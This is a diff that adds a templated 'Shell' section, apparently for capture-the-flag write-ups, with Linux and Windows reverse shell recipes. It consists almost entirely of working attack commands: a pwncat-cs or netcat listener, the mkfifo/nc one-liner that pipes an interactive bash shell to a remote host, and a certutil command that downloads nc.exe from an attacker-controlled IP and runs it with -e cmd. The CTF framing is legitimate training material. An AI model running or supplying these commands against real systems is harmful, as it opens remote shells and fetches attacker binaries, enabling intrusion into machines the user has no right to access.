@@ -1,1 +1,27 @@
 # Shell
+
+{% if OS == "Linux" -%}
+## Reverse Shell (Linux)
+We setup the listener with `pwncat-cs`
+```bash
+pwncat-cs -lp 4444
+```
+And initiate our connection from the client :
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $TARGET_CTF 4444 >/tmp/f
+```
+{% else %}
+## Reverse Shell (Windows)
+We setup the listener with `rlwrap` an `netcat` :
+
+```bash
+rlwrap nc -lvnp 4444
+```
+
+We downloaded `netcat` using `certutil` and run with Kali IP address and port opened before :
+
+```bash
+certutil -urlcache -f http://$TUN_IP:80/nc.exe C:\Users\Public\nc.exe
+C:\Users\Public\nc.exe $TARGET_CTF 4444 -e cmd
+```
+{%- endif %}
